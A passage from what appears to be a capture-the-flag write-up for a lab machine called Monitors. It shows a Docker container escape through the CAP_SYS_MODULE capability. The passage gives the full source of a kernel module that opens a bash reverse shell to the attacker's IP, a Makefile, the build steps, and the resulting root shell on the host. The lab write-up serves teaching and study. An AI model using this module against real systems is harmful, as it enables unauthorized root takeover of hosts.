gid=0(root)
groups=

```

When a docker container is run with `--privileged`, [the container get](https://capsule8.com/assets/ug/us-19-Edwards-Compendium-Of-Container-Escapes.pdf) `CAP_SYS_MODULE` (load a kernel module), `CAP_SYS_RAWIO` (access `/proc/kcore`, map `NULL`), and `CAP_SYS_ADMIN` (“true root” - `mount`, `debugfs`, more).

`CAP_SYS_MODULE` is the only one of those three present in this container, so the kernel module route seems a good target. Because of how Docker works, the kernel is shared by the host, so this gives the ability to load a kernel module on the host.

### Exploit

#### Strategy

I’m going to build a kernel modules that provides a reverse shell to the Monitors. Because kernel modules interact with the kernel at such a low level, I’ll need to build it in the same environment that I want to install it.

There are many posts that show how to do this exploit (like [this](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd) and [this](https://xcellerator.github.io/posts/docker_escape/)), but I found [this one from blog.nody.cc](https://blog.nody.cc/posts/container-breakouts-part2/) to be the simplest to follow.

The tools I need are already installed in the container, like `make` and `gcc`. The technique will also require the linux headers for the current kernel. They exist in `/usr/src`, which suggests they are already installed:

```

root@ec8b9784f4a1:~# ls /usr/src/
apache-ofbiz-17.12.01             linux-headers-4.15.0-142
linux-headers-4.15.0-132          linux-headers-4.15.0-142-generic  <-- matches uname -r 
linux-headers-4.15.0-132-generic
root@ec8b9784f4a1:~# uname -r
4.15.0-142-generic

```

#### Create Files

I’ll need two files. Because I hate working in a text editor with a reverse shell, I’ll create them locally, and then upload them.

I’ll take `reverse-shell.c` directly from the blog post, changing the IP of the reverse shell to my own:

```

#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.7/443 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

```

For the `Makefile`, I had issues with the stuff in `$()` running, but it was pretty obvious what should be there, so I just changed it to include hardcoded values:

```

obj-m +=reverse-shell.o
all:
        make -C /lib/modules/4.15.0-142-generic/build M=/root modules
clean:
        make -C /lib/modules/4.15.0-142-generic/build M=/root clean

```

I put `/root` where it was `$(PWD)`, so I’ll need to work out of that directory in the container on Monitors. I’ll be quick and cleanup once I’m done.

I’ll upload both those files to the container using `wget` and a Python webserver.

#### Build and Run

With both those files in `/root`, I’ll go into that directory and run `make`:

```

root@ec8b9784f4a1:~# make
make -C /lib/modules/4.15.0-142-generic/build M=/root modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
  CC [M]  /root/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/reverse-shell.mod.o
  LD [M]  /root/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'

```

This builds the kernel module.

Now I’ll start `nc` and install it with `insmod reverse-shell.ko`. On doing so, it’ll execute the reverse shell.

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.238] 42726
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# id
id
uid=0(root) gid=0(root) groups=0(root)

```

And grab `root.txt`:

```

root@monitors:/root# cat root.txt
8e510bad************************

```